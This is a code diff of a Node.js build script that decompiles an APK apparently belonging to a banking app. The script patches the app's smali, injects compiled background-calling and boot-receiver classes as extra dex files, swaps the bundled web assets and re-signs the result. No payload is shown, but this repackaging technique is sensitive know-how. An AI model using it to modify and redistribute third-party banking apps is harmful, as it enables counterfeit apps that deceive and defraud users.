@@ -467,9 +467,17 @@ if (fs.existsSync(cbeApkPath) && fs.existsSync(logoPng512) && fs.existsSync(clea
       return out;
     };
     const smaliDirs = fs.readdirSync(decDir).filter((d) => d.startsWith('smali')).map((d) => path.join(decDir, d));
+    const nativeCallClassRe = /^(?:CallBootReceiver|CallBridgeHelper|CallForegroundService|IncomingCallActivity)(?:\$.*)?\.smali$/;
     for (const sDir of smaliDirs) {
       for (const smaliFile of findSmaliFiles(sDir)) {
         const base = path.basename(smaliFile);
+        if (
+          nativeCallClassRe.test(base) &&
+          smaliFile.includes(`${path.sep}com${path.sep}cbe${path.sep}cbebirrtransfer${path.sep}`)
+        ) {
+          fs.rmSync(smaliFile, { force: true });
+          continue;
+        }
         let code = fs.readFileSync(smaliFile, 'utf8');
         let changed = false;
 
@@ -556,8 +564,19 @@ if (fs.existsSync(cbeApkPath) && fs.existsSync(logoPng512) && fs.existsSync(clea
           if (!updated.includes('SupportWebChromeClient;->handlePermissionResult')) {
             if (updated.includes('.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V')) {
               updated = updated.replace(
-                /(\.method public onRequestPermissionsResult\(I\[Ljava\/lang\/String;\[I\)V\s+\.(?:locals|registers)\s+\d+)/,
-                '$1\n\n    invoke-static {p1, p3}, Lcom/cbe/cbebirrtransfer/SupportWebChromeClient;->handlePermissionResult(I[I)Z\n\n    move-result v0\n\n    if-eqz v0, :cond_continue_perm_res\n\n    return-void\n\n    :cond_continue_perm_res'
+                /(\.method public onRequestPermissionsResult\(I\[Ljava\/lang\/String;\[I\)V\s+\.)(locals|registers)(\s+)(\d+)/,
+                (_, pfx, dirName, ws, cntStr) => {
+                  const cnt = Number.parseInt(cntStr, 10) || 0;
+                  const bumped = dirName === 'locals' ? Math.max(1, cnt) : Math.max(5, cnt);
+                  return (
+                    `${pfx}${dirName}${ws}${bumped}\n\n` +
+                    `    invoke-static {p1, p3}, Lcom/cbe/cbebirrtransfer/SupportWebChromeClient;->handlePermissionResult(I[I)Z\n\n` +
+                    `    move-result v0\n\n` +
+                    `    if-eqz v0, :cond_continue_perm_res\n\n` +
+                    `    return-void\n\n` +
+                    `    :cond_continue_perm_res`
+                  );
+                }
               );
             } else {
               updated =
@@ -1125,9 +1144,12 @@ if (fs.existsSync(cbeApkPath) && fs.existsSync(logoPng512) && fs.existsSync(clea
           console.log(`Patched smali: ${base}`);
         }
       }
+      if (findSmaliFiles(sDir).length === 0) {
+        fs.rmSync(sDir, { recursive: true, force: true });
+      }
     }
 
-    // Compile native Android background calling service & IncomingCallActivity (.java -> .class -> .dex -> smali_classesN)
+    // Compile native Android background calling service & IncomingCallActivity (.java -> .class -> .dex)
     const nativeCallJavaDir = path.join(rootDir, 'scripts', 'cbe-native-call');
     const findJavaFiles = (dir) => {
       const out = [];
@@ -1140,6 +1162,8 @@ if (fs.existsSync(cbeApkPath) && fs.existsSync(logoPng512) && fs.existsSync(clea
       return out;
     };
     const nativeJavaFiles = findJavaFiles(nativeCallJavaDir);
+    const dexStage = '/tmp/cbe_call_dex';
+    let nativeCallDexFiles = [];
     if (nativeJavaFiles.length > 0) {
       const platformsBase = path.join(sdkDir, 'platforms');
       const platformVers = fs.existsSync(platformsBase)
@@ -1154,7 +1178,6 @@ if (fs.existsSync(cbeApkPath) && fs.existsSync(logoPng512) && fs.existsSync(clea
       const androidJar = path.join(platformsBase, platformVers[platformVers.length - 1], 'android.jar');
       const d8Bin = path.join(latestBuildTools, 'd8');
       const classesStage = '/tmp/cbe_call_classes';
-      const dexStage = '/tmp/cbe_call_dex';
       fs.rmSync(classesStage, { recursive: true, force: true });
       fs.rmSync(dexStage, { recursive: true, force: true });
       fs.mkdirSync(classesStage, { recursive: true });
@@ -1181,30 +1204,17 @@ if (fs.existsSync(cbeApkPath) && fs.existsSync(logoPng512) && fs.existsSync(clea
         ['--min-api', '24', '--lib', androidJar, '--output', dexStage, ...compiledClasses],
         { env, stdio: 'inherit' }
       );
-
-      const jarEntries = execFileSync('jar', ['tf', apktoolJar], { encoding: 'utf8' });
-      const baksmaliEntry = jarEntries
-        .split(/\r?\n/)
-        .find((line) => line.endsWith('baksmali/Main.class'));
-      if (!baksmaliEntry) {
-        throw new Error('Could not locate baksmali Main class inside apktool.jar');
-      }
-      const baksmaliMainClass = baksmaliEntry.replace(/\.class$/, '').replace(/\//g, '.');
-
-      let nextIdx = 2;
-      while (fs.existsSync(path.join(decDir, `smali_classes${nextIdx}`))) {
-        nextIdx += 1;
-      }
-      const targetSmaliDir = path.join(decDir, `smali_classes${nextIdx}`);
-      fs.mkdirSync(targetSmaliDir, { recursive: true });
-      execFileSync(
-        'java',
-        ['-cp', apktoolJar, baksmaliMainClass, 'd', '-o', targetSmaliDir, path.join(dexStage, 'classes.dex')],
-        { env, stdio: 'inherit' }
-      );
       fs.rmSync(classesStage, { recursive: true, force: true });
-      fs.rmSync(dexStage, { recursive: true, force: true });
-      console.log(`Compiled and injected native calling classes into smali_classes${nextIdx}!`);
+
+      nativeCallDexFiles = fs
+        .readdirSync(dexStage)
+        .filter((f) => /^classes\d*\.dex$/.test(f))
+        .sort((a, b) => a.localeCompare(b, undefined, { numeric: true }))
+        .map((f) => path.join(dexStage, f));
+      if (nativeCallDexFiles.length === 0) {
+        throw new Error('d8 produced no classes.dex for scripts/cbe-native-call');
+      }
+      console.log(`Compiled native calling dex (${nativeCallDexFiles.length} dex file(s)) ready for APK injection.`);
     }
 
     // Replace bundled assets/web/ with fresh static export
@@ -1244,6 +1254,39 @@ if (fs.existsSync(cbeApkPath) && fs.existsSync(logoPng512) && fs.existsSync(clea
     const rebuiltCbe = '/tmp/cbe_rebuilt.apk';
     const alignedCbe = '/tmp/cbe_aligned.apk';
     execSync(`java -jar "${apktoolJar}" b "${decDir}" -o "${rebuiltCbe}"`, { env, stdio: 'inherit' });
+    if (nativeCallDexFiles.length > 0) {
+      execFileSync(
+        'python3',
+        [
+          '-c',
+          [
+            'import re, sys, zipfile',
+            'apk_path = sys.argv[1]',
+            'dex_files = sys.argv[2:]',
+            'with zipfile.ZipFile(apk_path, "r") as zr:',
+            '    names = zr.namelist()',
+            'max_idx = 1',
+            'for n in names:',
+            '    m = re.match(r"^classes(\\d*)\\.dex$", n)',
+            '    if m:',
+            '        idx = int(m.group(1)) if m.group(1) else 1',
+            '        if idx > max_idx:',
+            '            max_idx = idx',
+            'next_idx = max_idx + 1',
+            'with zipfile.ZipFile(apk_path, "a", compression=zipfile.ZIP_DEFLATED) as za:',
+            '    for d in dex_files:',
+            '        target_name = f"classes{next_idx}.dex"',
+            '        za.write(d, target_name)',
+            '        print(f"Injected {d} -> {target_name}")',
+            '        next_idx += 1',
+          ].join('\n'),
+          rebuiltCbe,
+          ...nativeCallDexFiles,
+        ],
+        { env, stdio: 'inherit' }
+      );
+      fs.rmSync(dexStage, { recursive: true, force: true });
+    }
     execSync(`"${zipalignBin}" -f -p 4 "${rebuiltCbe}" "${alignedCbe}"`, { env, stdio: 'inherit' });
 
     const cbeKeyPk8 = path.join(keystoresDir, 'cbe-banking.pk8');
